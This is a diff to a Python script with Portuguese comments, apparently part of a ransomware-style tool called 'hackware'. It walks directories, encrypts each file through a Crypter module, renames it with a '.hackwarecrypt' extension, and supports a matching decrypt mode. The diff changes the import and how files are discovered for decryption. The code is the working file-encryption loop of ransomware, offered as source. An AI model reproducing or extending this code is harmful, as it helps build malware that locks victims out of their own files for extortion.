@@ -5,7 +5,7 @@ from Crypto.Util import Counter
 import argparse
 import os
 import discovery
-import hue as Crypter
+import Crypter
 
 # ----------------------
 # Variáveis Globais
@@ -62,13 +62,17 @@ def main():
     startdirs = [init_path]
 
     for currentDir in startdirs:
-        for filename in discovery.discover(currentDir):
+        if not decrypt:
+            discovered_files = discovery.discover(currentDir)
+        else:
+            discovered_files = discovery.discover(currentDir, encrypted=True)
+
+        for filename in discovered_files:
             Crypter.change_files(filename, cryptFn)
             # Renomeia o arquivo pra indicar a encriptação
             if not decrypt:
                 os.rename(filename, filename+'.hackwarecrypt')
             else:
-                print("Desencriptando: {}".format(filename))
                 os.rename(filename, filename.replace('.hackwarecrypt', ''))
 
     # Limpa a chave de encriptação da Memória
